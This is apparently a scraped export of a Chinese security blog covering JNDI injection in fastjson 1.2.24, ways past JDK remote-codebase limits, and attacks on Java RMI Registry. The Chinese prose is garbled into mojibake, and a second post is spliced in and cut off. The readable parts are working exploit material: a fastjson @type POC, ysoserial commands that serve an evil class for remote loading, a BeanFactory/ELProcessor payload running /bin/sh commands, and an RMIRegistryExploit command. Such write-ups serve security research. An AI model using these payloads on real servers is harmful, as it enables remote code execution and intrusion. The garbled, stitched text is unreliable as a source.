JdbcRowSetImplÁ±ªfastjsonÁî±‰∫é@typeÁöÑÂ≠òÂú®ÔºåÂú®ÂèóÂΩ±ÂìçÁöÑÁâàÊú¨‰∏≠ÔºåÂÖ∂ÂèØ‰ª•ÂØπ‰ªªÊÑèÊåáÂÆöÁöÑÂØπË±°ËøõË°åÂèçÂ∫èÂàóÂåñÔºåÊ†πÊçÆËßÑÂàôËá™Âä®Ë∞ÉÁî®setter/getterÊù•ËææÂà∞ÂÆû‰æãËøòÂéüÁöÑÁõÆÁöÑ„ÄÇÈ¶ñÂÖàÊù•Áúã‰∏Ä‰∏ãPOC 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\":true&#125; ËøôÈáåÁöÑÂÖ≥ÈîÆÂú®‰∫éautoCommitÔºåÊù•Áúã‰∏Ä‰∏ãJdbcRowSetImplÁöÑsetAutoCommitÂáΩÊï∞ ËøôÈáåÂ¶ÇÊûúconn‰∏∫nullÁöÑËØùÔºå‰ºöË∞ÉÁî®connectÂáΩÊï∞ÔºåÁúã‰∏Ä‰∏ãconnectÂáΩÊï∞ ÁúãÂà∞ËøôÈáåÁî®JNDIËøõË°åÊï∞ÊçÆÂ∫ìËøûÊé•ÔºåÂπ∂‰∏îÁî±‰∫éfastjsonÁöÑÁâπÊÄßdataSourceÊòØÂèØÊéßÁöÑÔºåËøôÂ∞±ÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂lookupÁöÑÂèÇÊï∞ÔºåÂπ∂ÂêëÊÅ∂ÊÑèÁöÑserverÂèëËµ∑JNDIËøûÊé•„ÄÇÊ†πÊçÆÂâçÊñáËØ¥ÁöÑÂéüÁêÜÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÂæó‰∏ªÊú∫ÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ 0x03 ÁéØÂ¢ÉÂ§çÁé∞ÊîπÈÄ†JRMPListenerÁî±‰∫éJNDIÂ∫ïÂ±ÇÁî®ÁöÑÈÉΩÊòØRMIÁöÑ‰∏úË•øÔºåÊâÄ‰ª•Êàë‰ª¨Ë¶ÅÂª∫Á´ã‰∏Ä‰∏™ÁªëÂÆö‰∫ÜReferenceÁöÑRMIÊúçÂä°ÔºåÂèØ‰ª•Áõ¥Êé•ÊîπÊîπJRMPListener„ÄÇ Âú®RMIÈÉ®ÂàÜÊõæÁªèÂàÜÊûêËøáJRMPListenerÔºåÂÖ∂ËøîÂõû‰∫ÜExceptionalReturnÔºå‰ΩøÂæóÊûÑÈÄ†Â•ΩÁöÑExceptionÂú®ClientÂèçÂ∫èÂàóÂåñÊâßË°åÂëΩ‰ª§„ÄÇËÄåÂØπ‰∫éÁªëÂÆöReferenceÔºåÊàë‰ª¨ÈúÄË¶Å‰øÆÊîπExceptionalReturn‰∏∫NormalReturnÂπ∂Â∞ÜpayloadObjectÊîπ‰∏∫ReferenceWrapper payloadObjectÊîπ‰∏∫ReferenceWrapper ‰ΩÜÊòØÂú®ÂÆûÈôÖÊµãËØïÊó∂ÔºåÂèëÁé∞ClientËØ∑Ê±ÇÂêé‰∏çËÉΩÂÆåÂÖ®ÈÄÄÂá∫„ÄÇÂÖ∂ÂÆûÊàë‰ª¨‰πüÂèØ‰ª•Áõ¥Êé•Áî®‰∏äÈù¢ÁöÑ‰æãÂ≠ê ‰∏çËøáËøôÈáåÂ∞±Ëé∑Âèñ‰∏çÂà∞ÊòØÂê¶ÊúâËÆøÈóÆËøõÊù•ÔºåÊ†πÊçÆÂÆûÈôÖÁöÑÁéØÂ¢ÉÂèñËàçÂêßXD ÊîπÈÄ†ÂêéÁöÑÂ∑≤Êõ¥Êñ∞Âà∞github‰∏ä 12345678// ÂºÄÂêØÊåÇËΩΩ‰∫Üevil classÊñá‰ª∂ÁöÑHTTP Serverjava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.PayloadHTTPServer 80 EvilObj \"open /System/Applications/Calculator.app\"// ÂºÄÂêØRMI Reference Listenerjava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://localhost/// ÊàñËÄÖ‰ΩøÁî®RMIRefListener2ÔºåÈõÜÂêà‰∫Ü‰∏äÈù¢‰∏§‰∏™Ê≠•È™§java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 localhost:1099 80 EvilObj \"open /System/Applications/Calculator.app\" FastJSON 1.2.24 RCEËøôÈáåÊàë‰ª¨‰ª•FastJSON 1.2.24ÁâàÊú¨ÁöÑRCE‰∏∫‰æãÔºåÊù•ËØïÈ™åJNDI È¶ñÂÖàÂºÄÂêØ‰∏Ä‰∏™evil rmi server 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 host:1099 80 EvilObj \"touch /tmp/success\" Áî®vulhubÁöÑÁéØÂ¢É Âú®ÊúçÂä°Âô®Á´Ø‰ºöÊé•Êî∂Âà∞ËøûÊé• ËøõÂà∞dockerÈáåÂèØ‰ª•ÁúãÂà∞ÁîüÊàê‰∫ÜsuccessÊñá‰ª∂ 0x04 ÂêéÁª≠ÂâçÊñáÁî®ÁöÑÁéØÂ¢ÉÊòØJDK8u111ÔºåÂú®ÂêéÁª≠ÁöÑJDK8u113‰ª•ÂèäJDK6u132, JDK7u122‰πãÂêéÂ¢ûÂä†‰∫ÜÂØπËøúÁ®ãcodebaseÁöÑÈôêÂà∂ Á≥ªÁªüÂ±ûÊÄß com.sun.jndi.rmi.object.trustURLCodebase„ÄÅcom.sun.jndi.cosnaming.object.trustURLCodebase ÁöÑÈªòËÆ§ÂÄºÂèò‰∏∫falseÔºåÂç≥ÈªòËÆ§‰∏çÂÖÅËÆ∏‰ªéËøúÁ®ãÁöÑCodebaseÂä†ËΩΩReferenceÂ∑•ÂéÇÁ±ª„ÄÇÂ¶ÇÊûúÈúÄË¶ÅÂºÄÂêØ RMI Registry ÊàñËÄÖ COS Naming Service ProviderÁöÑËøúÁ®ãÁ±ªÂä†ËΩΩÂäüËÉΩÔºåÈúÄË¶ÅÂ∞ÜÂâçÈù¢ËØ¥ÁöÑ‰∏§‰∏™Â±ûÊÄßÂÄºËÆæÁΩÆ‰∏∫true„ÄÇ Changelog: JDK 6u141 http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141 JDK 7u131 http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html JDK 8u121 http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html ÊëòËá™https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html ÈÇ£‰πàÂ¶ÇÊûúÂ≠òÂú®ËøôÊ†∑‰∏Ä‰∏™ÊºèÊ¥û‰ΩÜÊòØÂèàÊòØÈ´òÁâàÊú¨ÁöÑJDKÁéØÂ¢ÉÔºåËØ•ÊÄé‰πàËøõË°åbypassÂë¢Ôºü ÊâæÂà∞‰∏Ä‰∏™ÂèóÂÆ≥ËÄÖÊú¨Âú∞CLASSPATH‰∏≠ÁöÑÁ±ª‰Ωú‰∏∫ÊÅ∂ÊÑèÁöÑReference FactoryÂ∑•ÂéÇÁ±ªÔºåÂπ∂Âà©Áî®Ëøô‰∏™Êú¨Âú∞ÁöÑFactoryÁ±ªÊâßË°åÂëΩ‰ª§„ÄÇ Âà©Áî®LDAPÁõ¥Êé•ËøîÂõû‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑÂ∫èÂàóÂåñÂØπË±°ÔºåJNDIÊ≥®ÂÖ•‰æùÁÑ∂‰ºöÂØπËØ•ÂØπË±°ËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰ΩúÔºåÂà©Áî®ÂèçÂ∫èÂàóÂåñGadgetÂÆåÊàêÂëΩ‰ª§ÊâßË°å„ÄÇ ÊëòËá™https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html ‰∏äÈù¢ÁöÑËøôÁØáÊñáÁ´†ÊèêÂá∫‰∫Ü‰∏äÈù¢‰∏§ÁßçÊñπÊ°àÊù•ËøõË°å„ÄÇ Âà©Áî®Â∫ïÂ±ÇÂçèËÆÆÂÆûÁé∞‰∏äÁöÑÊºèÊ¥ûÂÖàÊù•ËØ¥‰∏Ä‰∏ãÁ¨¨‰∫åÁßçÔºåËøôÈáåÊèêÂà∞Âà©Áî®ÁöÑÊòØLDAPÔºåËøôÈÉ®ÂàÜÊàë‰ª¨ÂêéÈù¢ÂÜçËØ¶ÁªÜÂèôËø∞ÔºåÂÖ∂ÂÆûÂéüÁêÜË∑üRMIÁöÑÂèçÂ∫èÂàóÂåñÈóÆÈ¢òÊòØ‰∏ÄÊ†∑ÁöÑ„ÄÇ ÊàëÂú®ÊµÖË∞àJava RMIÂèçÂ∫èÂàóÂåñÈóÆÈ¢ò‰∏≠ÊõæÊèêÂà∞ËøáÔºåJRMPListenerÂà©Áî®ÁöÑÊòØRMI ClientÂú®Êé•Êî∂ExceptionÊó∂ÂèëÁîüÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇËÄåËøôÈáåÁöÑJNDIÂ∫ïÂ±ÇÁî®ÁöÑ‰ªçÁÑ∂ÊòØRMIÈÇ£Â•ó(Â¶ÇÊûúÂçèËÆÆÊòØRMIÁöÑËØù)ÔºåÊâÄ‰ª•Êàë‰ª¨ÂèëËµ∑‰∏Ä‰∏™ÈìæÊé•Âà∞ysoserialÁöÑJRMPListener‰πüËøòÊòØËÉΩÊàêÂäüÂà©Áî®ÁöÑÔºå‰∏çÁÆ°ÊúâÊ≤°ÊúâËÆæÁΩÆcom.sun.jndi.rmi.object.trustURLCodebase‰∏∫true„ÄÇÂΩìÁÑ∂Â¶ÇÊûúË¶ÅÂà©Áî®ÊàêÂäüÔºåÂèëËµ∑Á´ØÂøÖÈ°ªË¶ÅÊúâÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊâÄ‰æùËµñÁöÑÁªÑ‰ª∂Âπ∂‰∏îÂêàÈÄÇÁöÑJDKÁâàÊú¨ÊâçÂèØ‰ª•„ÄÇ Âà©Áî®ÂèØÂà©Áî®ÁöÑÊú¨Âú∞FactoryÂØπË±°ÁÑ∂ÂêéÊàë‰ª¨Êù•ÁªßÁª≠ÁúãÁúãÁ¨¨‰∏ÄÁßçÊÉÖÂÜµ Âú®ÂâçÈù¢ÂàÜÊûêNamingManagerÁöÑgetObjectFactoryFromReferenceÊó∂ÔºåÊàëÁï•Ëøá‰∫ÜÊú¨Âú∞ÁöÑfactoryÁöÑËΩΩÂÖ•ÈÉ®ÂàÜÁöÑ‰ª£Á†Å ËøôÈáåÈ¶ñÂÖà‰ºöÂú®Êú¨Âú∞ÁöÑCLASSPATHÈáåÊâæËøô‰∏™factoryNameÔºåÂ¶ÇÊûúÊâæÂà∞‰∫ÜÔºåÂêéÁª≠Â∞±‰∏çÁî®ËøõË°åËøúÁ®ãÂä†ËΩΩ„ÄÇÊâÄ‰ª•Â¶ÇÊûúÊú¨Âú∞ÂèØ‰ª•ÊâæÂà∞‰∏Ä‰∏™ÂèØÂà©Áî®ÁöÑfactoryÔºå‰πüËÉΩÁ™ÅÁ†¥JNDIÁöÑËøúÁ®ãÂä†ËΩΩÁöÑÈôêÂà∂„ÄÇ ÂâçÈù¢ÁöÑÊñáÁ´†‰∏≠ÊèêÂà∞‰∫ÜtomcatÔºàÊàñglassfishÔºâ‰∏≠ÁöÑBeanFactoryÁöÑÂà©Áî®ÔºåÊù•ÂàÜÊûê‰∏Ä‰∏ã È¶ñÂÖàÂú®ÂêéÁª≠ÁöÑË∞ÉÁî®‰∏≠ÔºåfactoryÁöÑgetObjectInstanceÂáΩÊï∞Â∞Ü‰ºöË¢´Ë∞ÉÁî® 123// ref ‰∏∫Êàë‰ª¨‰º†ÂÖ•ÁöÑReference ÂèØÊéß// name ‰∏∫factoryÁöÑnameÔºåËøôÈáåÂ∞±ÊòØÊàë‰ª¨Ëá™Â∑±‰º™ÈÄ†ÁöÑ*EvilObj* ÂèØÊéßfactory.getObjectInstance(ref, name, nameCtx, environment); Êù•Áúã‰∏Ä‰∏ãBeanFactory‰∏≠getObjectInstanceÂáΩÊï∞ÁöÑÂÆûÁé∞ÔºåÂáΩÊï∞ÊúâÁÇπÈïøÔºåÊàë‰ª¨ÊåëÈáçÁÇπÁúã 123456789101112131415161718192021222324if (obj instanceof ResourceRef) &#123; try &#123; Reference ref = (Reference) obj; String beanClassName = ref.getClassName(); Class&lt;?&gt; beanClass = null; ClassLoader tcl = Thread.currentThread().getContextClassLoader(); if (tcl != null) &#123; try &#123; beanClass = tcl.loadClass(beanClassName);// ËΩΩÂÖ•ÊåáÂÆöclass &#125; catch(ClassNotFoundException e) &#123; &#125; &#125; else &#123; try &#123; beanClass = Class.forName(beanClassName);// ËΩΩÂÖ•ÊåáÂÆöclass &#125; catch(ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125; // ... // ... Object bean = beanClass.newInstance();// ÂÆû‰æãÂåñ ÂÖàÁúãËøôÈÉ®ÂàÜ‰ª£Á†ÅÔºåÂΩìÂâçÊàë‰ª¨‰º†ÂÖ•ÁöÑReferenceÂøÖÈ°ªÊòØResourceRefÂØπË±°ÔºåÂπ∂Âú®ÂêéÁª≠Âä†ËΩΩResourceRefÁöÑbeanClassÂíåshilihuanewInstanceËøõË°å(ËÄåËøôÈáåÁöÑclassÊàë‰ª¨ÂèØ‰ª•Âú®ËµãÂÄºÊó∂ÈöèÊÑèÊåáÂÆö)„ÄÇ 123456789101112131415161718192021222324252627RefAddr ra = ref.get(\"forceString\");Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;();String value;if (ra != null) &#123; value = (String)ra.getContent(); // ... /* Items are given as comma separated list */ for (String param: value.split(\",\")) &#123; param = param.trim(); index = param.indexOf('='); if (index &gt;= 0) &#123;// Â¶ÇÊûúÂÜÖÂÆπ‰∏≠Â≠òÂú®=ÔºåÊèêÂèñ=ÂêéÈù¢ÁöÑÂ≠óÁ¨¶‰∏≤‰Ωú‰∏∫ÂáΩÊï∞Âêç setterName = param.substring(index + 1).trim(); param = param.substring(0, index).trim(); &#125; else &#123; setterName = \"set\" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1); &#125; try &#123; forced.put(param, beanClass.getMethod(setterName, paramTypes)); &#125; // ... &#125;&#125; ReferenceRefÂ≠òÂú®ÁùÄÂèØÊéßÁöÑÈîÆÂÄºÂØπÂÖ≥Á≥ªÔºåÈÄöËøágetÂáΩÊï∞Ëé∑ÂæóÔºåÂ¶Ç‰∏äËø∞‰ª£Á†Åref.get(&quot;forceString&quot;)Â∞Ü‰ºöËé∑ÂæóforceStringÁõ∏ÂØπÂ∫îÁöÑRefAddrÔºåÈÄöËøáË∞ÉÁî®RefAddrÁöÑgetContentÂáΩÊï∞Â∞±ÂèØ‰ª•Ëé∑ÂæóforceStringÈîÆÂØπÂ∫îÁöÑÂÄº„ÄÇ ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÂΩìforceStringÂØπÂ∫îÁöÑÂÜÖÂÆπ‰∏≠Â≠òÂú®=Êó∂ÔºåÂ∞ÜÊà™Âèñ=ÂêéÈù¢ÁöÑÂ≠óÁ¨¶‰∏≤‰Ωú‰∏∫ÂêéÁª≠Ë∞ÉÁî®ÁöÑÂáΩÊï∞Âêç„ÄÇËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•‰ªªÊÑèÊåáÂÆöÂΩìÂâçÂØπË±°ÁöÑÁ±ªÂáΩÊï∞‰∫Ü„ÄÇforceÈîÆÂÄºÂØπ‰∏≠Â∞ÜÂåÖÂê´=ÂâçÈù¢ÁöÑÂÜÖÂÆπÂíåÁõ∏Â∫îÁöÑMethodÂØπË±°„ÄÇ‰æãÂ¶Çtest=eval,ÊúÄÁªàÊàë‰ª¨Â∞ÜÂæóÂà∞evalÁöÑMethodÂØπË±° 123456789101112131415161718192021222324252627282930313233Enumeration&lt;RefAddr&gt; e = ref.getAll();while (e.hasMoreElements()) &#123; ra = e.nextElement(); String propName = ra.getType(); if (propName.equals(Constants.FACTORY) || propName.equals(\"scope\") || propName.equals(\"auth\") || propName.equals(\"forceString\") || propName.equals(\"singleton\")) &#123; continue; &#125; value = (String)ra.getContent(); Object[] valueArray = new Object[1]; /* Shortcut for properties with explicitly configured setter */ Method method = forced.get(propName); if (method != null) &#123; valueArray[0] = value; try &#123; method.invoke(bean, valueArray); &#125; catch (IllegalAccessException| IllegalArgumentException| InvocationTargetException ex) &#123; throw new NamingException (\"Forced String setter \" + method.getName() + \" threw exception for property \" + propName); &#125; continue; &#125; ref.getAllËé∑Âèñ‰∫ÜÊâÄÊúâÁöÑRefAddrÔºåÂØπ‰∫éÈùûConstants.FACTORY/scope/auth/forceString/singleton‰∏îÂâçÊñáÂèàËé∑ÂèñÁõ∏Â∫îÁöÑMethodÂØπË±°Êó∂ÔºåÊàë‰ª¨Â∞ÜË∞ÉÁî®ËØ•ÂØπË±°ÔºåÂÖ∂ÂáΩÊï∞ÂèÇÊï∞‰∏∫Ê≠§Êó∂RefAddrÁöÑÂÜÖÂÆπ„ÄÇÊØîÂ¶ÇÂ≠òÂú®‰∏Ä‰∏™RefAddrÁöÑtype‰∏∫testÔºåÂ∞ÜË∞ÉÁî®ÂâçÈù¢ÁöÑevalÁöÑMethodÂØπË±°„ÄÇ Âà∞ËøôÈáåÔºåÊàë‰ª¨Â∞±ÂÆåÊàê‰∫Ü‰∏ÄÊ¨°ÂèçÂ∞ÑË∞ÉÁî®ÔºåÊù•ÁúãÁúãpoc 1234567891011121314// payload from kingxResourceRef ref = new ResourceRef( \"javax.el.ELProcessor\",// bean class null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",// factory class null);ref.add(new StringRefAddr(\"forceString\", \"KINGX=eval\"));// evalÂáΩÊï∞MethodÂØπË±°Â∞Ü‰ºöË¢´Ë∞ÉÁî®ref.add(new StringRefAddr(\"KINGX\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\")\" + \".newInstance().getEngineByName(\\\"JavaScript\\\")\" + \".eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](\" + \"['/bin/sh','-c','\"+ command +\"'])\" + \".start()\\\")\"));// evalÂáΩÊï∞ÁöÑÂèÇÊï∞‰∏∫‰∏äËø∞ÊâßË°åÂëΩ‰ª§ÁöÑelËØ≠Âè• 0x05 ÊÄªÁªìÂâçÈù¢ÂØπJNDI with RMIÂÅö‰∫Ü‰∏Ä‰∫õÁÆÄÂçïÁöÑ‰ªãÁªçÔºåÂΩìÈÅáÂà∞ÂèØÊéßÁöÑJNDI lookupÂáΩÊï∞ÔºåÊàë‰ª¨ÂèØ‰ª•ÂèëËµ∑JNDIÈìæÊé•Âà∞RMIÊúçÂä°‰∏äÔºåÂà©Áî®JNDI Naming ManagerÁöÑËøúÁ®ãcodebaseÂä†ËΩΩÊú∫Âà∂ËΩΩÂÖ•‰ªªÊÑèÁöÑbytecodes„ÄÇ ÂΩìÁÑ∂ÔºåÂâçÈù¢ÁöÑÂà©Áî®ÊñπÂºè‰ªÖÂú®JDK8u113„ÄÅJDK6u132,„ÄÅJDK7u122ÁâàÊú¨‰πãÂâçÔºåÂ¶ÇÊûúÈÅáÂà∞‰∫ÜÈ´òÁâàÊú¨ÁöÑJDKÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ùËØïÂà©Áî®Êú¨Âú∞CLASSPATH‰∏≠ÂèØÂà©Áî®ÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÔºåÊàñËÄÖÊòØtomcatÁéØÂ¢É‰∏ãÁöÑÂèØÂà©Áî®ÁöÑObjectFactory„ÄÇ Âú®ÂêéÁª≠ÂèØÂà©Áî®ÁöÑÊú¨Âú∞FactoryËøô‰∏™ÊÄùË∑Ø‰∏äÔºåÂéüÊñá‰ΩúËÄÖkingxÊèêÂá∫ÊàñËÆ∏ÂÖ∂‰ªñÁöÑ‰∏≠Èó¥‰ª∂ÁéØÂ¢É‰πüÂèØËÉΩÂ≠òÂú®ËøôÁßçÂèØÂà©Áî®ÁöÑObjectFactoryÔºåËøôÈáåÁ´ã‰∏™flagÔºå‰ª•ÂêéÊúâÁ©∫‰∫Ü‰∏ÄÂÆöË¶ÅÊâæÊâæXD"},{"title":"„Äênotes„ÄëÊµÖË∞àJava RMI RegistryÂÆâÂÖ®ÈóÆÈ¢ò","permalink":"http://blog.0kami.cn/2020/02/06/java/rmi-registry-security-problem/","text":"0x00 ÂâçË®ÄÊú¨ÊñáËÆ≤Ëø∞‰∫ÜJava RMI RegistryÁõ∏ÂÖ≥ÁöÑÂèçÂ∫èÂàóÂåñÈóÆÈ¢òÔºå‰∏ªËÆ≤RegistryÔºåÂêéÁª≠Ë°•ÂÖÖ‰∫ÜClientÁ´ØÂíåServerÁ´ØÁöÑÂà©Áî® 0x01 ÂéüÁêÜJava RMIÊµÅÁ®ãÂèØÂèÇËÄÉ1ÔºåÂá∫ÈóÆÈ¢òÁöÑ‰ΩçÁΩÆÂú®‰∫éÔºö ÊÉÖÊôØ‰∏ÄÔºöRegistry Êé•Êî∂bind/rebindËØ∑Ê±Ç ‰ªéClientÊé•Êî∂Âà∞ÁöÑbindÊàñrebindÁöÑremote objÔºåÂ∞ÜÁî±sun/rmi/registry/RegistryImpl_Skel.java#dispatchÂ§ÑÁêÜ Ôºà‰∏ãÂõæ‰∏∫JDK8u141‰πãÂâçÁöÑÁâàÊú¨ÁöÑÂÆûÁé∞Ôºâ ÂèØ‰ª•ÁúãÂà∞Ëé∑ÂèñÂà∞ÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆÁõ¥Êé•Ë∞ÉÁî®‰∫ÜreadObjectÂáΩÊï∞ÔºåÂØºËá¥‰∫ÜÂ∏∏ËßÑÁöÑJavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑËß¶Âèë„ÄÇ ËøôÈáåÊàë‰ª¨Âè™ÈúÄË¶ÅÂÜô‰∏Ä‰∏™bindÊàñrebindÁöÑÊìç‰ΩúÔºåÂç≥ÂèØÊîªÂáªÂà∞RMI Registry„ÄÇ Ê≥®ÊÑèÔºöbind/rebindËØ∑Ê±ÇÁöÑÈôêÂà∂RegistryÂØπ‰∫ébind/rebindÁöÑËØ∑Ê±ÇÔºå‰ºöÂéªÊ£ÄÊü•Ëøô‰∏™ËØ∑Ê±ÇÊòØÂê¶‰∏∫Êú¨Âú∞ËØ∑Ê±ÇÔºåÂØπ‰∫éÂ§ñÈÉ®ÁöÑËØ∑Ê±ÇÔºåRegistry‰ºöÊãíÁªùËØ•ËØ∑Ê±Ç„ÄÇ ËøôÈáåÊÄùË∑ØÊòØÊ≠£Á°ÆÁöÑÔºåÂèØ‰ª•Èò≤Ê≠¢Â§ñÈÉ®ÁöÑÊÅ∂ÊÑèÁªëÂÆöÔºå‰ΩÜÊòØ‰ªñÂú®ÂÆûÁé∞‰∏äÂ≠òÂú®ÈóÆÈ¢ò„ÄÇ JDK 8u141‰πãÂâçÔºåÈ¶ñÂÖà‰ºöÂéªÊé•Êî∂‰º†ÈÄÅËøáÊù•ÁöÑÂØπË±°ÔºåÂπ∂Â∞ÜÂÖ∂ËøõË°åreadObjectÂèçÂ∫èÂàóÂåñÔºåÂÆûÈôÖÂà§Êñ≠ÊòØÂê¶‰∏∫Êú¨Âú∞ËØ∑Ê±ÇÔºåÊòØÂú®putÊñ∞ÁöÑÁªëÂÆöÂØπË±°‰πãÂâçËøõË°åÁöÑ„ÄÇËøôÊÑèÂë≥ÁùÄÂú®checkAccess‰πãÂâçÊàë‰ª¨Â∞±ÂèØ‰ª•ÂÆåÊàêÂèçÂ∫èÂàóÂåñÊìç‰ΩúÔºåËØ•ÈôêÂà∂Âπ∂Ê≤°ÊúâËµ∑Âà∞Áõ∏Â∫îÁöÑ‰ΩúÁî®„ÄÇ ËÄåÂú®JDK 8u141ÁâàÊú¨‰πãÂêéÔºåsun/rmi/registry/RegistryImpl_Skel.java#dispatch ËøôÈáå‰ºöÂÖàÂéªÂà§Êñ≠ÊòØÂê¶‰∏∫Êú¨Âú∞ÁªëÂÆöËØ∑Ê±ÇÔºåÁÑ∂ÂêéÂÜçËøõË°åÂèçÂ∫èÂàóÂåñ„ÄÇ ÊâÄ‰ª•Â¶ÇÊûúË¶Å‰ΩøÁî®bind/rebindËØ∑Ê±ÇÊù•ËøúÁ®ãÊîªÂáªRegistryÔºåJDKÁâàÊú¨ÂøÖÈ°ªÂú®8u141‰πãÂâç ÊÉÖÊôØ‰∫åÔºöRegistryÊé•Êî∂lookupËØ∑Ê±ÇÁî±‰∫ébind/rebindËØ∑Ê±ÇÂú®141ÂêéÁª≠ÁâàÊú¨Â≠òÂú®ÈôêÂà∂ÔºåÊâÄ‰ª•‰∏∫‰∫ÜÊîªÂáªRegistryÊàë‰ª¨ÂøÖÈ°ªÊâæÂÖ∂‰ªñÁöÑÊñπÊ≥ï„ÄÇ Âú®RMIÈáåÂÆ¢Êà∑Á´ØÂêëRegistryÂèëËµ∑lookupËØ∑Ê±ÇÊòØ‰∏çÈôêÂà∂ËØ∑Ê±ÇÊ∫êÁöÑÔºåÈÇ£‰πàlookupÊòØÂê¶ÂèØ‰ª•Ë¢´Êàë‰ª¨Âà©Áî®Âë¢Ôºü Á≠îÊ°àÊòØËÇØÂÆöÁöÑÔºåÊù•Áúãsun.rmi.registry.RegistryImpl_Skel#dispatchÂØπ‰∫élookupËØ∑Ê±ÇÁöÑÂ§ÑÁêÜ ÂèØ‰ª•ÁúãÂà∞Âú®ËøôÈáåÔºåÊé•Êî∂Âà∞lookupÂèëÈÄÅËøáÊù•ÁöÑÂÜÖÂÆπÊó∂Ôºå‰πüÊòØÁõ¥Êé•ÂØπÂÖ∂ËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰Ωú„ÄÇ‰ΩÜÊòØËøôÈáåÂπ∂Ê≤°Êúâbind/rebindÁöÑËØ∑Ê±ÇÊ∫êÈôêÂà∂ÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Áõ¥Êé•lookupÂèëËµ∑ÂØπ141ÁâàÊú¨‰πãÂêéÁöÑregistryÁöÑÊîªÂáª„ÄÇ Êàë‰ª¨Âú®ÊûÑÈÄ†lookupÂáΩÊï∞ËØ∑Ê±ÇÊó∂ÔºåÂè™ÈúÄÈáçÊñ∞ÂÆûÁé∞‰∏Ä‰∏ãlookupÂáΩÊï∞ÁöÑÂÆûÁé∞Â∞±ÂèØ‰ª•‰∫ÜÔºàËøôÈáåÂ∞ÜNaming.lookupÂíåRegistryImpl_Stub.lookupËøõË°å‰∫ÜÂêàÂπ∂ÔºåÂπ∂Â∞Ü‰º†ÈÄÅËøáÂéªÁöÑÂÜÖÂÆπÊîπÊàê‰∫Ü‰ªªÊÑèÁöÑObjectÂØπË±°Ôºâ„ÄÇ 0x02 ÊîªÂáªRegistry jdk&lt;8u121ÁéØÂ¢É‰ΩøÁî®jdk8u111ÔºåËØ•ÁâàÊú¨‰∏ãÁöÑRMI RegistryÊé•Êî∂ÁöÑremote objÂè™Ë¶ÅÁªßÊâø‰∫ÜRemoteÁ±ªÂç≥ÂèØÔºàÂéüÁêÜËßÅ2ÔºâÔºåÊ≤°ÊúâÂÖ∂‰ªñÁöÑÈôêÂà∂„ÄÇ ysoserialÂ∑•ÂÖ∑‰∏≠ÁöÑysoserial.exploit.RMIRegisterExploitÈááÁî®‰∫Ü‰ª£ÁêÜRemoteÁ±ªÁöÑÊñπÂºèÊù•Ëß£ÂÜ≥Ëøô‰∏™ÈôêÂà∂„ÄÇ ‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§Âç≥ÂèØ java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit RMIRegisterHost RMIRegisterPort CommonsCollections7 &quot;open /System/Applications/Calculator.app&quot; ÁÆÄÂçïÁúã‰∏Ä‰∏ãysoserial.exploit.RMIRegisterExploitÁöÑÂéüÁêÜÊ†πÊçÆÂâçÈù¢ÊñáÁ´†‰∏≠ÁöÑÂéüÁêÜÔºåÊàë‰ª¨‰º†ËøáÂéªÁöÑÂØπË±°ÂøÖÈ°ªË¶ÅÊòØ‰∏Ä‰∏™ÁªßÊâø‰∫Üjava.rmi.RemoteÊé•Âè£ÁöÑÂØπË±°„ÄÇËøôÈáåysoserialÂ∑•ÂÖ∑ÂàôÁõ¥Êé•Âà©Áî®Âä®ÊÄÅ‰ª£ÁêÜÁöÑÂéüÁêÜÔºåÂØπRemoteÁ±ªÂÅö‰ª£ÁêÜÔºåÂÖ∂Â§ÑÁêÜÁöÑhandlerÁî®‰∫ÜCommonsCollections‰∏≠Â∏∏Áî®ÁöÑAnnotationInvocationHandler„ÄÇ‰ΩÜÂÖ∂Ëß¶ÂèëÁÇπÂèò‰∏∫handlerÁöÑmemberValuesÂ±ûÊÄßË¢´ÂèçÂ∫èÂàóÂåñÊâÄÊâßË°åÁöÑÂà©Áî®Èìæ„ÄÇ Êé•‰∏ãÊù•ÔºåËøúÁ®ãbindÂØπË±°Â∞ÜÊûÑÈÄ†Â•ΩÁöÑremoteÂØπË±°‰º†ËøáÂéªÂç≥ÂèØÔºåÊù•Áúã‰∏Ä‰∏ãËøô‰∏™‰ª£Á†Å 0x03 ÊîªÂáªRegistry 